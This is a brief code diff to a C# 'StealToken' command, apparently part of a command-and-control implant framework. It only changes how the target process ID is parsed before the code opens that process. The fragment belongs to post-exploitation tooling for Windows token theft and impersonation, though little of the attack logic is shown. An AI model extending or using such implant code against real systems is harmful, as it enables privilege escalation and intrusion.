@@ -4,6 +4,7 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Threading;
 using System.Threading.Tasks;
+
 using DInvoke.Data;
 
 namespace Drone.Commands;
@@ -18,7 +19,7 @@ public sealed class StealToken : DroneCommand
 
     public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
-        var pid = uint.Parse(task.Arguments[0]);
+        var pid = uint.Parse(task.Arguments["pid"]);
 
         var hProcess = IntPtr.Zero;
         var status = NtOpenProcess(pid,
